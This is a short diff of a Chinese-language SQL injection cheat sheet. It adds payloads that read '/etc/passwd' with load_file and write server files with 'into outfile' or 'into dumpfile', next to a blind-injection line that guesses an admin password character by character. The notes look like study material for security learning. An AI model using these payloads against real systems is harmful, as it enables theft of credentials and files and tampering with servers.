@@ -71,11 +71,11 @@ version\(\) - 数据库版本号。
 
 具体猜解列中数据：?id = 5 and ascii\(substring\(\(select passwd from admin limit 0,1\),1,1\)&gt;64\) **二分法**
 
+读取文件：?id = 5 union select 1,2,load\_file\('/etc/passwd'\) **需要读权限**
+
+写文件：?id = 5 union select ... into outfile '/file' 或者 into dumpfile 'file'，dumpfile相比outfile更适合二进制文件。
+
 ### 流程
-
-
-
-
 
 
 
